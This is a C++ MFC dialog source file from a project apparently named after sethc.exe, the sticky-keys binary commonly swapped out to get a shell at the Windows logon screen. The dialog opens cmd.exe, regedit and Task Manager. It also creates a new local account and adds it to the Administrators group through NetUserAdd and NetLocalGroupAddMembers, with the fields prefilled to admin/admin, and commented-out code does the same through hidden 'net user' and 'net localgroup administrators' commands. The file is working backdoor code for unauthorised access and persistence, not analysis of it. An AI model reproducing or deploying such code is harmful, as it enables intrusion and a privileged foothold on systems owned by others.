// SystemDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Sethc.h"
#include "SystemDlg.h"
#include <lm.h> 
#pragma comment(lib,"netapi32") 

// CSystemDlg 对话框

IMPLEMENT_DYNAMIC(CSystemDlg, CDialog)

CSystemDlg::CSystemDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSystemDlg::IDD, pParent)
	, m_strUser(_T(""))
	, m_strPwd(_T(""))
{
	m_strSystemPath = _T("");
	m_strWindowsPath = _T("");
}

CSystemDlg::~CSystemDlg()
{
}

void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_USERNAME, m_strUser);
	DDX_Text(pDX, IDC_EDIT_PASSWORD, m_strPwd);
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	ON_BN_CLICKED(IDC_BTN_CMD, &CSystemDlg::OnBnClickedBtnCmd)
	ON_BN_CLICKED(IDC_BTN_EXPLORER, &CSystemDlg::OnBnClickedBtnExplorer)
	ON_BN_CLICKED(IDC_BTN_REG, &CSystemDlg::OnBnClickedBtnReg)
	ON_BN_CLICKED(IDC_BTN_TASK, &CSystemDlg::OnBnClickedBtnTask)
	ON_BN_CLICKED(IDC_BTN_ADD, &CSystemDlg::OnBnClickedBtnAdd)
	ON_BN_CLICKED(IDC_BTN_RESET, &CSystemDlg::OnBnClickedBtnReset)
END_MESSAGE_MAP()


// CSystemDlg 消息处理程序

BOOL CSystemDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetDlgItemText(IDC_EDIT_USERNAME, _T("admin"));
	SetDlgItemText(IDC_EDIT_PASSWORD, _T("admin"));

	CString strSysPath = _T("");
	CString strWinPath = _T("");

	UINT32 result = ERROR_SUCCESS;
	bool bSuccess = true;
	result = GetSystem32Path(strSysPath, &bSuccess);
	if (ERROR_SUCCESS == result)
	{
		if (bSuccess)
		{
			m_strSystemPath = strSysPath;
		}
	}
	else
	{
		MessageBox(_T("Cannot find the System32 directory!"), _T("ERROR"), MB_ICONERROR);
	}

	result = GetWindowsPath(strWinPath, &bSuccess);
	if (ERROR_SUCCESS == result)
	{
		if (bSuccess)
		{
			m_strWindowsPath = strWinPath;
		}
	}
	else
	{
		MessageBox(_T("Cannot find the windows directory!"), _T("ERROR"), MB_ICONERROR);
	}

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CSystemDlg::OnBnClickedBtnCmd()
{
	// TODO: 在此添加控件通知处理程序代码
	ExecSysCmd(1);
}

void CSystemDlg::OnBnClickedBtnExplorer()
{
	// TODO: 在此添加控件通知处理程序代码
	ExecSysCmd(2);
}

void CSystemDlg::OnBnClickedBtnReg()
{
	// TODO: 在此添加控件通知处理程序代码
	ExecSysCmd(3);
}

void CSystemDlg::OnBnClickedBtnTask()
{
	// TODO: 在此添加控件通知处理程序代码
	ExecSysCmd(4);
}

void CSystemDlg::OnBnClickedBtnAdd()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData(TRUE);
	if (m_strUser.IsEmpty())
	{
		MessageBox(_T("Please Input UserName!"), _T("WARNING"), MB_OK);
		return;
	}
	if (m_strPwd.IsEmpty())
	{
		MessageBox(_T("Please Input Password!"), _T("WARNING"), MB_OK);
		return;
	}
	ExecSysCmd(5);
}

void CSystemDlg::OnBnClickedBtnReset()
{
	// TODO: 在此添加控件通知处理程序代码
	SetDlgItemText(IDC_EDIT_USERNAME, _T(""));
	SetDlgItemText(IDC_EDIT_PASSWORD, _T(""));
}

UINT32 CSystemDlg::GetSystem32Path( OUT CString& strPath, OUT bool* pbSuccess )
{
	UINT32 nResult = ERROR_SUCCESS;
	if (NULL == pbSuccess)
	{
		nResult = ERROR_INVALID_PARAMETER;
		return nResult;
	}
	bool bSuccess = true;
	if (!strPath.IsEmpty())
	{
		strPath.Empty();
	}
	TCHAR szPath[MAX_PATH] = {0};
	try
	{
		int nLength = GetSystemDirectory(szPath, MAX_PATH);
		if (0 == nLength)
		{
			bSuccess = false;
			nResult = GetLastError();
			throw nResult;
		}
	}
	catch (UINT32)
	{
	}
	strPath.Format(_T("%s"), szPath);
	*pbSuccess = bSuccess;
	return nResult;
}

UINT32 CSystemDlg::GetWindowsPath( OUT CString& strPath, OUT bool* pbSuccess )
{
	UINT32 nResult = ERROR_SUCCESS;
	if (NULL == pbSuccess)
	{
		nResult = ERROR_INVALID_PARAMETER;
		return nResult;
	}
	bool bSuccess = true;
	if (!strPath.IsEmpty())
	{
		strPath.Empty();
	}
	TCHAR szPath[MAX_PATH] = {0};
	try
	{
		int nLength = GetWindowsDirectory(szPath, MAX_PATH);
		if (0 == nLength)
		{
			bSuccess = false;
			nResult = GetLastError();
			throw nResult;
		}
	}
	catch (UINT32)
	{
	}
	strPath.Format(_T("%s"), szPath);
	*pbSuccess = bSuccess;
	return nResult;
}

void CSystemDlg::ExecSysCmd(IN const int nCmd)
{
	CString strExecPath = _T("");
	switch (nCmd)
	{
	case 1:   //cmdshell
		strExecPath = m_strSystemPath + _T("\\")  + _T("cmd.exe"); 
		ShellExecute(NULL, _T("open"), strExecPath, NULL, NULL, SW_SHOW);
		break;
	case 2:  // explorer
		strExecPath = m_strWindowsPath + _T("\\")  + _T("explorer.exe"); 
		ShellExecute(NULL, _T("open"), strExecPath, NULL, NULL, SW_SHOW);
		break;
	case 3:  // Regedit
		strExecPath = m_strWindowsPath + _T("\\")  + _T("regedit.exe"); 
		ShellExecute(NULL, _T("open"), strExecPath, NULL, NULL, SW_SHOW);
		break;
	case 4:  //taskMgr
		strExecPath = m_strSystemPath + _T("\\")  + _T("taskMgr.exe"); 
		ShellExecute(NULL, _T("open"), strExecPath, NULL, NULL, SW_SHOW);
		break;
	case 5:   //Add User
		{ 
// 			strExecPath = m_strSystemPath + _T("\\")  + _T("cmd.exe");
// 			CString strCommond = _T("");
// 			strCommond.Format(_T("/c net user %s %s /add"), m_strUser, m_strPwd);
// 			ShellExecute(NULL, _T("open"), strExecPath, strCommond, NULL, SW_HIDE);
// 			strCommond.Empty();
// 			strCommond.Format(_T("/c net localgroup administrators %s /add"), m_strUser);
// 			ShellExecute(NULL, _T("open"), strExecPath, strCommond, NULL, SW_HIDE);
// 			CString strMsg = _T("");
// 			strMsg.Format(_T("Manage account: %s Add Success!"), m_strUser);
// 			MessageBox(strMsg, _T("OK"), MB_OK);

			bool bRet = AddUser();
			CString strMsg = _T("");
			if (bRet)
			{
				strMsg.Format(_T("Manager account: %s Add Success!"), m_strUser);
				MessageBox(strMsg, _T("OK"), MB_OK);
			}
			else
			{
				strMsg.Format(_T("Manager account: %s Add Failed!"), m_strUser);
				MessageBox(strMsg, _T("Failed"), MB_OK);
			}
		}
		break;
	default:
		break;
	}
}

//添加管理员帐号
bool CSystemDlg::AddUser()
{
	USER_INFO_1 ui;
	bool bAdd = true;  //是否添加成功
	DWORD dwError = 0; 

	ui.usri1_name = m_strUser.GetBuffer(0); 
	ui.usri1_password = m_strPwd.GetBuffer(0); 
	ui.usri1_priv = USER_PRIV_USER; 
	ui.usri1_home_dir = NULL; 
	ui.usri1_comment = NULL; 
	ui.usri1_flags = UF_SCRIPT; 
	ui.usri1_script_path = NULL; 
	//添加名为test11的用户,密码为Test!@#123:
	if(NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) != NERR_Success) 
	{
		bAdd = false;
		return bAdd;
	} 

	wchar_t szAccountName[100] = {0}; //字符数组清0
	wsprintfW(szAccountName, m_strUser);
	LOCALGROUP_MEMBERS_INFO_3 account; 
	account.lgrmi3_domainandname = szAccountName; 
	//把test11添加到Administrators组 
	if( NetLocalGroupAddMembers(NULL, L"Administrators" , 3 , (LPBYTE)&account, 1) != NERR_Success) 
	{
		bAdd = false;
	}

	return bAdd;
}

BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (WM_KEYDOWN == pMsg->message)
	{
		if (VK_RETURN == pMsg->wParam)
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}
